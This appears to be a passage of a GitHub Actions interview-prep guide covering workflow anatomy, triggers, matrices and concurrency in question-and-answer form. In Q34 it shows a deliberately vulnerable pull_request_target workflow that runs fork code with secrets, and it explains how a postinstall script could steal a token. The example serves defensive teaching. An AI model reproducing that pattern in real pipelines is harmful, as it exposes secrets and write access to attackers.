# GitHub Actions — Core Concepts

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> Syntax, triggers, contexts, reuse, runners, OIDC, hardening, cost and release automation for GitHub Actions, plus best practices and rapid-fire commands · 200 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to GitHub Actions](./README.md) · [🏠 Home](../README.md)

## Table of contents
- [Workflow Anatomy & Execution Model](#workflow-anatomy--execution-model) — Q1–Q22
- [Triggers & Events](#triggers--events) — Q23–Q48
- [Jobs, Steps, Matrix & Concurrency](#jobs-steps-matrix--concurrency) — Q49–Q78
- [Contexts, Expressions, Env & Outputs](#contexts-expressions-env--outputs) — Q79–Q104
- [Secrets, Variables, Environments & Permissions](#secrets-variables-environments--permissions) — Q105–Q124
- [Custom Actions & Reusable Workflows](#custom-actions--reusable-workflows) — Q125–Q148
- [Caching, Artifacts, Runners & ARC](#caching-artifacts-runners--arc) — Q149–Q168
- [OIDC & Security Hardening](#oidc--security-hardening) — Q169–Q182
- [Debugging, Cost, Monorepos & Releases](#debugging-cost-monorepos--releases) — Q183–Q192
- [Rapid-fire Commands & Syntax](#rapid-fire-commands--syntax) — Q193–Q200

---

## Workflow Anatomy & Execution Model

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. Define workflow, run, job, step, action and runner in one line each. 🟢

<details>
<summary><b>Answer</b></summary>

- **Workflow**: a YAML file in `.github/workflows/` that declares triggers and jobs.
- **Run**: one execution of a workflow caused by one event (has a run ID and run attempts).
- **Job**: a set of steps that executes on one runner; jobs run in parallel unless linked by `needs`.
- **Step**: a single `run` command or a `uses` action inside a job, executed in order.
- **Action**: a reusable unit defined by `action.yml` (composite, JavaScript or Docker).
- **Runner**: the machine (hosted VM, self-hosted host, or ARC pod) running the `actions/runner` agent that executes jobs.

</details>

### Q2. What is the minimum valid workflow file? 🟢

<details>
<summary><b>Answer</b></summary>

It needs `on` and at least one job with `runs-on` and `steps`. `name` is optional (the file path is shown instead).

```yaml
on: push
jobs:
  hello:
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Hello from ${{ github.repository }}"
```

Note there is no checkout: without `actions/checkout` the workspace is empty, which surprises people the first time.

</details>

### Q3. Where must workflow files live, and does the file extension matter? 🟢

<details>
<summary><b>Answer</b></summary>

Directly in `.github/workflows/` of the repository, with a `.yml` or `.yaml` extension. Subdirectories are not scanned (so `.github/workflows/ci/build.yml` never runs). Local composite actions conventionally live in `.github/actions/<name>/action.yml`, and they are not workflows. Reusable workflows must also sit directly in `.github/workflows/`.

</details>

### Q4. Which version of the workflow file does GitHub use for a given run? 🟡

<details>
<summary><b>Answer</b></summary>

The file at the commit SHA associated with the event (`GITHUB_SHA`):

- `push`: the pushed commit, so a branch can modify its own workflow.
- `pull_request`: the merge commit `refs/pull/N/merge`, so the PR's version of the workflow runs.
- `pull_request_target`, `workflow_run`, `schedule`, `issue_comment`: the default branch (base) version.
- `workflow_dispatch`: the ref you choose when dispatching.

This is why changing a `schedule` on a feature branch does nothing until it is merged.

</details>

### Q5. What does a GitHub-hosted runner give you at the start of a job? 🟢

<details>
<summary><b>Answer</b></summary>

A fresh VM (destroyed after the job) with a preinstalled image: common languages, Docker, kubectl, Helm, AWS/Azure/GCP CLIs, `gh`, `jq` and more. Standard Linux runners for private repos have 2 vCPU, 7 GB RAM and about 14 GB of free SSD; public repos get 4 vCPU and 16 GB. You get passwordless `sudo`, outbound internet, and the workspace at `$GITHUB_WORKSPACE` (`/home/runner/work/<repo>/<repo>`). Nothing persists between jobs except what you put in cache or artifacts.

</details>

### Q6. Should you use `ubuntu-latest` or `ubuntu-24.04`? 🟢

<details>
<summary><b>Answer</b></summary>

In production we pin `ubuntu-24.04`. `-latest` labels migrate to a new OS version on GitHub's schedule (ubuntu-latest moved from 22.04 to 24.04 in late 2024), which silently changes tool versions, default Python, and package names, and breaks builds on a day nobody touched the repo. Pin the image, and upgrade deliberately with a PR. Also note old images are retired (ubuntu-20.04 was removed in 2025), and jobs targeting retired labels fail.

</details>

### Q7. What runner images and architectures can you choose from? 🟡

<details>
<summary><b>Answer</b></summary>

- Linux x64: `ubuntu-24.04`, `ubuntu-22.04`
- Linux arm64: `ubuntu-24.04-arm`, `ubuntu-22.04-arm` (free for public repos; larger arm runners for private)
- Windows: `windows-2025`, `windows-2022`
- macOS: `macos-15`, `macos-14` (Apple silicon), plus Intel labels while they last
- **Larger runners**: org-configured labels with more cores, static IPs, GPU, or private networking

Native arm64 runners replace slow QEMU emulation for multi-arch images: build each platform natively and merge manifests.

</details>

### Q8. How does `runs-on` select a runner when you give multiple labels? 🟡

<details>
<summary><b>Answer</b></summary>

An array means AND: the runner must have **all** labels.

```yaml
runs-on: [self-hosted, linux, arm64, gpu]
```

You can also target a group, optionally with labels:

```yaml
runs-on:
  group: prod-runners
  labels: [linux, x64]
```

For ARC scale sets, `runs-on` is the scale set installation name (for example `arc-runner-set`), and it must match exactly; ARC scale sets do not use extra custom labels the way classic runners do.

</details>

### Q9. What is the difference between `run` and `uses` in a step? 🟢

<details>
<summary><b>Answer</b></summary>

`run` executes a script in a shell on the runner (bash by default on Linux and macOS, pwsh on Windows). `uses` invokes an action: from a public repo (`actions/checkout@v4`), a local path (`./.github/actions/setup`), or a Docker image (`docker://alpine:3.20`). A step cannot have both. Inputs to an action go in `with:`; environment for either goes in `env:`.

</details>

### Q10. What shell options does a `run` step use by default on Linux? 🟡

<details>
<summary><b>Answer</b></summary>

If you do not set `shell`, GitHub runs `bash -e {0}` when bash exists: fail on the first error, but **no** `pipefail`. If you explicitly set `shell: bash`, it runs `bash --noprofile --norc -eo pipefail {0}`, which also fails on pipeline errors. So `npm test | tee out.log` can pass with failing tests under the default shell. Many teams set this globally:

```yaml
defaults:
  run:
    shell: bash
```

Other options: `sh`, `pwsh`, `python`, `cmd`, or a custom template like `perl {0}`.

</details>

### Q11. What do `defaults.run.shell` and `defaults.run.working-directory` do, and where can they be set? 🟢

<details>
<summary><b>Answer</b></summary>

They set the default shell and working directory for every `run` step, at workflow level or job level (job level wins; a step's own `shell` or `working-directory` wins over both). They do not apply to `uses` steps. Typical monorepo use:

```yaml
jobs:
  api:
    defaults:
      run:
        working-directory: services/api
```

</details>

### Q12. What are the main environment variables GitHub sets on the runner? 🟢

<details>
<summary><b>Answer</b></summary>

`GITHUB_SHA`, `GITHUB_REF` (`refs/heads/main`), `GITHUB_REF_NAME` (`main`), `GITHUB_HEAD_REF` and `GITHUB_BASE_REF` (PRs only), `GITHUB_REPOSITORY`, `GITHUB_ACTOR`, `GITHUB_EVENT_NAME`, `GITHUB_EVENT_PATH` (full JSON payload), `GITHUB_WORKSPACE`, `GITHUB_RUN_ID`, `GITHUB_RUN_NUMBER`, `GITHUB_RUN_ATTEMPT`, `RUNNER_OS`, `RUNNER_ARCH`, `RUNNER_TEMP`, `CI=true`, plus the file-command paths `GITHUB_OUTPUT`, `GITHUB_ENV`, `GITHUB_PATH`, `GITHUB_STEP_SUMMARY`. These are the runtime twins of the `github` and `runner` contexts.

</details>

### Q13. Why is there both `${{ github.sha }}` and `$GITHUB_SHA`, and when do you prefer each? 🟡

<details>
<summary><b>Answer</b></summary>

`${{ github.sha }}` is expanded by GitHub **before** the script reaches the runner, so it works anywhere in YAML (`if`, `with`, `runs-on`, `concurrency`). `$GITHUB_SHA` is an environment variable read by the shell at runtime. Inside `run:` scripts prefer environment variables: they are not subject to script injection and they keep the script readable. For non-default contexts (`github.event.pull_request.title`), map them through `env:` first.

</details>

### Q14. What is `$GITHUB_EVENT_PATH` and how do you use it? 🟡

<details>
<summary><b>Answer</b></summary>

It is the path to a JSON file holding the full webhook payload of the triggering event, the same data as `github.event`. Useful for scripts that need deep fields without expression gymnastics:

```bash
jq -r '.pull_request.labels[].name' "$GITHUB_EVENT_PATH"
```

Treat every string field in it (titles, branch names, commit messages) as untrusted input.

</details>

### Q15. What does `actions/checkout` do by default, and what are the common options? 🟢

<details>
<summary><b>Answer</b></summary>

It clones the repo at `GITHUB_SHA` into `$GITHUB_WORKSPACE`, shallowly (`fetch-depth: 1`), and persists the `GITHUB_TOKEN` into the local git config so later `git push` works. Common options:

```yaml
- uses: actions/checkout@v4
  with:
    fetch-depth: 0              # full history (tags, git describe, changelogs)
    ref: ${{ github.event.pull_request.head.sha }}
    persist-credentials: false  # do not leave the token in .git/config
    submodules: recursive
    sparse-checkout: services/api
    lfs: true
```

Set `persist-credentials: false` unless a later step really needs to push.

</details>

### Q16. How do job-level and step-level failures propagate to the run result? 🟢

<details>
<summary><b>Answer</b></summary>

A step that exits non-zero fails the job, and remaining steps are skipped unless they have `if: always()` or `if: failure()`. A failed job fails the run and causes dependent jobs to be skipped. The run conclusion is the worst job conclusion, except that skipped jobs do not cause failure. `continue-on-error: true` on a step or job records the failure but treats it as success for flow control, and the step's `outcome` is `failure` while its `conclusion` is `success`.

</details>

### Q17. What is the difference between a step's `outcome` and `conclusion`? 🟡

<details>
<summary><b>Answer</b></summary>

`steps.<id>.outcome` is the real result before `continue-on-error` is applied; `steps.<id>.conclusion` is the result after. With `continue-on-error: true` a failing step has `outcome == 'failure'` and `conclusion == 'success'`. Use `outcome` to react to soft failures:

```yaml
- id: e2e
  continue-on-error: true
  run: npm run e2e
- if: steps.e2e.outcome == 'failure'
  run: echo "::warning::E2E failed, not blocking"
```

</details>

### Q18. What is `timeout-minutes` and what are the default limits? 🟢

<details>
<summary><b>Answer</b></summary>

`timeout-minutes` cancels a job or step that exceeds the limit. The default job timeout is 360 minutes (6 hours) on hosted runners, which is the maximum there; self-hosted jobs can run up to 5 days. A workflow run can last at most 35 days including waiting for approvals. We always set an explicit short job timeout (for example 15 to 30 minutes): a hung test burning 6 hours of minutes on every run is a common cost leak.

</details>

### Q19. How do you run a job inside a container image, and what changes? 🟡

<details>
<summary><b>Answer</b></summary>

```yaml
jobs:
  test:
    runs-on: ubuntu-24.04
    container:
      image: node:22-bookworm
      options: --user 1001
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

All `run` steps and JavaScript actions execute inside that container; the workspace is mounted in. Works only on Linux runners. You lose some preinstalled tools from the host image, and the container may run as root, which can leave root-owned files in the workspace on self-hosted runners.

</details>

### Q20. What are service containers and how does networking differ between container jobs and host jobs? 🟡

<details>
<summary><b>Answer</b></summary>

`services` start sidecar containers (databases, Redis) for the job, with health-checked startup via `options`.

```yaml
services:
  postgres:
    image: postgres:16
    env: { POSTGRES_PASSWORD: test }
    ports: ["5432:5432"]
    options: >-
      --health-cmd "pg_isready -U postgres" --health-interval 5s --health-retries 10
```

If the job runs **on the host**, reach the service at `localhost:5432` through the mapped port. If the job runs **in a container**, both share a Docker network and you use the service name: `postgres:5432`, no port mapping needed.

</details>

### Q21. How are logs, annotations and step summaries different? 🟢

<details>
<summary><b>Answer</b></summary>

- **Logs**: raw stdout and stderr per step, retained with the run (90 days by default).
- **Annotations**: `::error file=app.js,line=10::msg`, `::warning::`, `::notice::` messages that appear on the run summary and inline on the PR diff.
- **Step summary**: markdown appended to `$GITHUB_STEP_SUMMARY`, rendered on the run page; good for test results, image digests, and deployment URLs.

```bash
echo "### Image pushed: \`$IMAGE@$DIGEST\`" >> "$GITHUB_STEP_SUMMARY"
```

</details>

### Q22. What happens, step by step, between `git push` and the first step running? 🔴

<details>
<summary><b>Answer</b></summary>

1. GitHub emits a `push` event and evaluates every workflow file at the pushed SHA.
2. For each workflow, `on.push` filters (`branches`, `tags`, `paths`) are matched against the ref and the changed files (only the first 300 changed files are considered for path filters).
3. Matching workflows create a run; job-level `if` expressions that only use available contexts are evaluated; jobs without `needs` are queued.
4. Each queued job requests a runner matching `runs-on`. Hosted: a VM is provisioned. Self-hosted: an idle runner long-polling the broker gets the job message.
5. The runner receives the job with a freshly minted `GITHUB_TOKEN`, downloads every referenced action at its resolved ref, then runs the "Set up job" step and your steps in order, streaming logs back.

</details>

---

## Triggers & Events

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q23. How do you trigger a workflow on pushes to `main` and on PRs that target `main`? 🟢

<details>
<summary><b>Answer</b></summary>

```yaml
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
```

For `pull_request`, `branches` filters the **base** branch, not the head. Without filters, the workflow runs on every push to every branch and every PR, which doubles runs when a PR branch is pushed (one `push`, one `pull_request`).

</details>

### Q24. What activity types does `pull_request` trigger on by default, and how do you add more? 🟡

<details>
<summary><b>Answer</b></summary>

By default: `opened`, `synchronize` (new commits) and `reopened`. Add types explicitly when needed, for example to re-run checks when a label is added or a draft becomes ready:

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review, labeled]
```

Then skip drafts with `if: github.event.pull_request.draft == false`. Note `closed` is how you detect a merge: `if: github.event.pull_request.merged == true`.

</details>

### Q25. How do `branches` and `branches-ignore` filters work with globs? 🟢

<details>
<summary><b>Answer</b></summary>

They accept glob patterns: `*` matches anything except `/`, `**` matches anything including `/`, and `!` negates within `branches` (order matters; later patterns override earlier). You cannot use `branches` and `branches-ignore` for the same event.

```yaml
on:
  push:
    branches:
      - main
      - "release/**"
      - "!release/**-alpha"
```

</details>

### Q26. How do path filters work, and what are their limits? 🔴

<details>
<summary><b>Answer</b></summary>

`paths` runs the workflow only if at least one changed file matches; `paths-ignore` skips if all changed files match. Combined with `branches`, both must match. Limits that bite:

- Only the first 300 changed files in a diff are evaluated, so huge PRs may not trigger.
- On `push` of a new branch, the diff is computed against the default branch tip or is unavailable, so behaviour can differ.
- Tag pushes ignore path filters (paths do not apply to tags).
- A workflow skipped by path filters never reports a check, so a **required** check stays "Expected — Waiting for status to be reported".

</details>

### Q27. How do you trigger only on version tags, and what is the gotcha with pushing many tags? 🟡

<details>
<summary><b>Answer</b></summary>

```yaml
on:
  push:
    tags: ["v*.*.*"]
```

Use `tags` alone if you want only tags; a `push` with `branches` but no `tags` filter ignores tag pushes. Gotcha: when more than three tags are pushed at once (`git push --tags`), GitHub does not create push events for them, so the release workflow never runs. Push release tags one at a time.

</details>

### Q28. What is `workflow_dispatch`, and what input types does it support? 🟢

<details>
<summary><b>Answer</b></summary>

It adds a "Run workflow" button and API endpoint for manual runs on a chosen ref. Inputs support `string`, `boolean`, `choice`, `number` and `environment` types, with `required`, `default` and `description`.

```yaml
on:
  workflow_dispatch:
    inputs:
      environment: { type: environment, required: true }
      dry_run: { type: boolean, default: true }
      log_level:
        type: choice
        options: [info, debug]
```

Read them with `inputs.dry_run` (typed) rather than `github.event.inputs.dry_run` (always a string).

</details>

### Q29. Why does `github.event.inputs.dry_run == true` never match, while `inputs.dry_run` works? 🟡

<details>
<summary><b>Answer</b></summary>

`github.event.inputs` comes from the webhook payload where every value is a string, so the boolean input is `'true'` (a string). `inputs.dry_run` preserves the declared type and is a real boolean. Comparing a string to a boolean with `==` coerces both to numbers (`'true'` becomes `NaN`), so the comparison is false. Use `inputs.dry_run` or compare `github.event.inputs.dry_run == 'true'`.

</details>

### Q30. How do you trigger a `workflow_dispatch` from the CLI and from the API? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
gh workflow run deploy.yml --ref main -f environment=staging -f dry_run=false
gh run watch $(gh run list --workflow deploy.yml --limit 1 --json databaseId -q '.[0].databaseId')
```

API:

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/ORG/REPO/actions/workflows/deploy.yml/dispatches \
  -d '{"ref":"main","inputs":{"environment":"staging"}}'
```

The workflow must exist on the default branch for the button and the `gh workflow run` lookup to appear.

</details>

### Q31. How does the `schedule` trigger work, and what are its quirks? 🟡

<details>
<summary><b>Answer</b></summary>

```yaml
on:
  schedule:
    - cron: "17 3 * * 1-5"   # 03:17 UTC Monday to Friday
```

- POSIX cron evaluated in **UTC**, so 09:00 IST is `30 3 * * *`.
- Runs only from the default branch's workflow file, with `GITHUB_SHA` at the default branch tip.
- The shortest interval is every 5 minutes, and runs are best-effort: delayed or dropped at peak times, especially at the top of the hour. Use odd minutes.
- In public repos, schedules are disabled automatically after 60 days without repository activity.

</details>

### Q32. What is `repository_dispatch` and how does it differ from `workflow_dispatch`? 🟡

<details>
<summary><b>Answer</b></summary>

`repository_dispatch` is a webhook you fire at the repo with a custom `event_type` and arbitrary `client_payload` JSON; every workflow listening for that type runs on the default branch. It is for cross-repo or external-system triggers ("library released, rebuild consumers"). `workflow_dispatch` targets one workflow, on a chosen ref, with typed inputs, and has a UI button.

```bash
gh api repos/ORG/app/dispatches -f event_type=lib-released \
  -F 'client_payload[version]=2.3.0'
```

```yaml
on:
  repository_dispatch:
    types: [lib-released]
```

</details>

### Q33. What is the difference between `pull_request` and `pull_request_target` in terms of context and permissions? 🔴

<details>
<summary><b>Answer</b></summary>

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Workflow file from | PR merge commit | Base branch |
| `GITHUB_SHA` / default checkout | PR merge ref | Base branch tip |
| Secrets for fork PRs | No | Yes |
| `GITHUB_TOKEN` for fork PRs | Read-only | Can be read/write |

`pull_request_target` exists so workflows can label, comment on, or triage fork PRs. It is safe only while it never executes PR code. The moment you check out `github.event.pull_request.head.sha` and run `npm install`, `make` or tests, the attacker's code runs with your secrets and write token.

</details>

### Q34. What is a "pwn request"? Show the vulnerable pattern. 🔴

<details>
<summary><b>Answer</b></summary>

A `pull_request_target` (or `workflow_run`) workflow that runs attacker-controlled code with privileged context.

```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: npm ci && npm test   # package.json scripts run with secrets in env and a write token
```

The attacker edits `package.json` `postinstall` to exfiltrate `secrets.NPM_TOKEN` or push to `main`. Fix: use `pull_request` for building and testing, and keep `pull_request_target` jobs to metadata operations with no checkout of head code. If you must, gate it behind a maintainer-applied label and an environment with required reviewers.

</details>

### Q35. When should you use `workflow_run`, and what is its security trap? 🔴

<details>
<summary><b>Answer</b></summary>

`workflow_run` starts a workflow when another workflow completes, in the base repo's privileged context. The common safe pattern: an unprivileged `pull_request` workflow builds and uploads results as an artifact, and a privileged `workflow_run` workflow posts the PR comment.

```yaml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
```

Trap: the artifact is attacker-controlled. Downloading it and executing it, or `source`-ing values from it into scripts, or extracting it into the workspace over trusted files, is a pwn request. Treat artifact content as data, validate it (for example, a PR number must be an integer), and never run it.

</details>

### Q36. Which events triggered by `GITHUB_TOKEN` do not start new runs, and why? 🟡

<details>
<summary><b>Answer</b></summary>

Pushes, tag creation, PR creation, releases and other events made with the workflow's `GITHUB_TOKEN` do not trigger workflows, to prevent recursive loops. The exceptions are `workflow_dispatch` and `repository_dispatch`, which do trigger. So a release workflow that creates a tag with `GITHUB_TOKEN` will not fire your `on: push: tags` deploy. Use a GitHub App installation token (`actions/create-github-app-token`) or explicitly dispatch the next workflow.

</details>

### Q37. What is the `merge_group` event and why do required-check workflows need it? 🟡

<details>
<summary><b>Answer</b></summary>

With a merge queue enabled, GitHub creates temporary branches (`gh-readonly-queue/main/pr-123-...`) combining queued PRs and fires `merge_group`. Required checks must report on those commits, otherwise the queue waits forever.

```yaml
on:
  pull_request:
  merge_group:
    types: [checks_requested]
```

The check names in `merge_group` runs must match the required check names.

</details>

### Q38. How do you run a workflow when an issue or PR comment says `/deploy`, safely? 🔴

<details>
<summary><b>Answer</b></summary>

```yaml
on:
  issue_comment:
    types: [created]
jobs:
  deploy:
    if: >
      github.event.issue.pull_request &&
      startsWith(github.event.comment.body, '/deploy') &&
      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
    runs-on: ubuntu-24.04
    environment: preview
```

`issue_comment` runs from the default branch with secrets, so the authorization check matters. Never interpolate `comment.body` into a script, and resolve the PR head SHA via the API and pin to it, so a push after the comment cannot swap the code (time-of-check to time-of-use).

</details>

### Q39. What does `on: release` with `types: [published]` give you compared to a tag push? 🟡

<details>
<summary><b>Answer</b></summary>

`release: published` fires when a GitHub Release is published (including from drafts), with the release object in `github.event.release` (tag, body, assets upload URL, `prerelease` flag). A tag push fires as soon as the tag exists, before any release notes. Use `release` when humans curate notes or when you want prereleases to skip prod (`if: ${{ !github.event.release.prerelease }}`). Remember a release created by `GITHUB_TOKEN` will not trigger it.

</details>

### Q40. How do you make one workflow serve both PRs and manual runs with different behaviour? 🟢

<details>
<summary><b>Answer</b></summary>

Branch on `github.event_name`:

```yaml
on:
  pull_request:
  workflow_dispatch:
    inputs:
      full: { type: boolean, default: false }
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - run: npm test -- ${{ (github.event_name == 'workflow_dispatch' && inputs.full) && '--all' || '--changed' }}
```

`inputs.full` is null for PR runs, so the expression falls through to `--changed`.

</details>

### Q41. Can a workflow trigger on changes to a specific file in another repository? 🟡

<details>
<summary><b>Answer</b></summary>

No, triggers only fire on events of the repo that holds the workflow. Options: the other repo fires `repository_dispatch` (or `workflow_dispatch`) at yours with a token that has access; a scheduled poll that checks a version; or Dependabot/Renovate opening PRs when the dependency changes. Within an org, a reusable workflow in a central repo is called by consumers, which is the reverse direction.

</details>

### Q42. What triggers exist for GitHub Packages, deployments and checks? 🟡

<details>
<summary><b>Answer</b></summary>

- `registry_package` (types `published`, `updated`) when a package or container image is published to GitHub Packages.
- `deployment` and `deployment_status` when deployments are created or change state (used by integrations like external CD tools).
- `check_run` and `check_suite` for check events from apps.
- `status` when a commit status changes.

Most run from the default branch, and like all events created by `GITHUB_TOKEN`, those created by your own workflow do not retrigger.

</details>

### Q43. How does a reusable workflow get triggered, and can it also be triggered directly? 🟢

<details>
<summary><b>Answer</b></summary>

`on: workflow_call` makes it callable from other workflows at job level. You can combine triggers so the same file also runs on its own:

```yaml
on:
  workflow_call:
    inputs:
      environment: { type: string, required: true }
  workflow_dispatch:
    inputs:
      environment: { type: environment, required: true }
```

Inside, `inputs.environment` works for both triggers, and `github.event_name` tells you which one fired (for a call it reports the caller's event).

</details>

### Q44. Do workflows run for pull requests from forks, and what restrictions apply? 🟡

<details>
<summary><b>Answer</b></summary>

Yes, `pull_request` workflows run for fork PRs, but: secrets are empty (except `GITHUB_TOKEN`), `GITHUB_TOKEN` is read-only, OIDC tokens are not issued with write access by default, and first-time contributors (configurable: new to GitHub, or all outside collaborators) need a maintainer to click "Approve and run". Dependabot PRs are treated similarly: they use Dependabot secrets instead of Actions secrets and a read-only token.

</details>

### Q45. How do you skip CI for a commit, and when does the skip not apply? 🟢

<details>
<summary><b>Answer</b></summary>

Include `[skip ci]`, `[ci skip]`, `[no ci]`, `[skip actions]` or `[actions skip]` in the commit message (or a `skip-checks: true` trailer). It applies to `push` and `pull_request` events, using the HEAD commit. It does not apply to other events, and it leaves required checks pending, so the PR cannot merge until something runs. In practice we use path filters for docs-only changes rather than relying on commit messages.

</details>

### Q46. What is the `workflow_call` event payload, and which `github` context values does a called workflow see? 🔴

<details>
<summary><b>Answer</b></summary>

A called workflow runs as part of the caller's run, so `github.event_name`, `github.event`, `github.sha`, `github.ref` and `github.actor` are the **caller's**. `github.workflow` is the caller's name too, while `github.workflow_ref` points at the caller and `job_workflow_sha` (in OIDC claims) identifies the called file. This matters for concurrency groups (use `github.workflow` carefully to avoid collisions between callers) and for OIDC trust policies that want to pin to a specific reusable workflow via the `job_workflow_ref` claim.

</details>

### Q47. How do you prevent a workflow from running on forks of your repository (for example, scheduled jobs)? 🟢

<details>
<summary><b>Answer</b></summary>

Forks copy workflows, and scheduled or push workflows may run in the fork owner's account. Guard jobs with the repository name:

```yaml
jobs:
  nightly:
    if: github.repository == 'devopsshack/shack-api'
```

Forks of public repos have Actions disabled until the owner enables them, but the guard keeps forks that enable Actions from attempting deploys that will fail anyway.

</details>

### Q48. Which trigger would you choose for each: lint on PRs, nightly dependency scan, on-demand DB migration, deploy after CI passes in another workflow? 🟡

<details>
<summary><b>Answer</b></summary>

- Lint on PRs: `pull_request` (with `paths` if it is a monorepo).
- Nightly scan: `schedule` plus `workflow_dispatch` so it can be run on demand.
- DB migration: `workflow_dispatch` with an `environment` input, and the job bound to that environment for approval.
- Deploy after CI: better to make deploy a job in the same workflow with `needs`, or call a reusable workflow. Use `workflow_run` only when the workflows must stay separate, and check `github.event.workflow_run.conclusion == 'success'` and `head_branch`.

</details>

---

## Jobs, Steps, Matrix & Concurrency

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q49. How does `needs` work, and what happens to a job whose dependency failed or was skipped? 🟢

<details>
<summary><b>Answer</b></summary>

`needs: [build, test]` makes a job wait until both finish successfully. If any needed job fails, is cancelled, or is skipped, the dependent job is skipped by default, and the skip propagates transitively down the chain. To run anyway, add a status function to the job `if`:

```yaml
deploy:
  needs: [build, scan]
  if: ${{ !cancelled() && needs.build.result == 'success' && needs.scan.result != 'failure' }}
```

</details>

### Q50. What is the implicit `success()` in a job `if`, and why is `always()` usually the wrong fix? 🟡

<details>
<summary><b>Answer</b></summary>

Any job `if` without a status function gets an implicit `success() &&` prefix, so `if: github.ref == 'refs/heads/main'` really means `success() && github.ref == ...`. The confusion is the opposite case: people write `if: always() && ...` to handle a skipped optional dependency and then the job runs even after a real failure, or even after the run is cancelled. Prefer `!cancelled()` over `always()`, and check `needs.<job>.result` explicitly for each dependency.

</details>

### Q51. What values can `needs.<job>.result` take? 🟢

<details>
<summary><b>Answer</b></summary>

`success`, `failure`, `cancelled`, or `skipped`. A job with `continue-on-error: true` that failed reports `success`. In a matrix job, the result is the aggregate: `failure` if any leg failed (and was not continue-on-error), `cancelled` if cancelled. That aggregate is what a fan-in job sees, which is why one fan-in job is a reliable single required check.

</details>

### Q52. How does a matrix expand, and how are job names generated? 🟢

<details>
<summary><b>Answer</b></summary>

Every combination of the matrix variables becomes one job (Cartesian product), named `jobid (v1, v2)` unless you set `name`.

```yaml
strategy:
  matrix:
    os: [ubuntu-24.04, windows-2025]
    node: [20, 22, 24]
runs-on: ${{ matrix.os }}
name: test (${{ matrix.os }}, node ${{ matrix.node }})
```

That is 6 jobs. A run can generate at most 256 matrix jobs per matrix. Matrix job names are what branch protection sees, so renaming a matrix value renames the required check.

</details>

### Q53. How do `include` and `exclude` work in a matrix? 🟡

<details>
<summary><b>Answer</b></summary>

`exclude` removes combinations matching all listed keys. `include` either adds keys to existing combinations that match (without overwriting original values) or, if it matches none, adds a new standalone combination. Exclusions are processed before inclusions.

```yaml
matrix:
  os: [ubuntu-24.04, windows-2025]
  node: [20, 22]
  exclude:
    - { os: windows-2025, node: 20 }
  include:
    - { node: 22, coverage: true }          # adds coverage to both node 22 legs
    - { os: macos-15, node: 22 }            # new extra leg
```

</details>

### Q54. What do `fail-fast` and `max-parallel` do? 🟢

<details>
<summary><b>Answer</b></summary>

`fail-fast` (default `true`) cancels the remaining in-progress and queued matrix jobs as soon as one fails. Set it to `false` when you want the full picture, for example to see if a failure is only on Windows. `max-parallel` caps how many matrix jobs run at once, useful for self-hosted capacity or for tests that hit a shared rate-limited resource.

</details>

### Q55. How do you build a matrix dynamically from a previous job? 🔴

<details>
<summary><b>Answer</b></summary>

Emit JSON as a job output and parse it with `fromJSON`:

```yaml
jobs:
  plan:
    runs-on: ubuntu-24.04
    outputs:
      services: ${{ steps.list.outputs.services }}
    steps:
      - uses: actions/checkout@v4
      - id: list
        run: echo "services=$(ls services | jq -R . | jq -cs .)" >> "$GITHUB_OUTPUT"
  build:
    needs: plan
    if: needs.plan.outputs.services != '[]'
    strategy:
      matrix:
        service: ${{ fromJSON(needs.plan.outputs.services) }}
    runs-on: ubuntu-24.04
    steps:
      - run: echo "building ${{ matrix.service }}"
```

Guard against an empty list, since an empty matrix fails the workflow with a "does not contain any values" error.

</details>

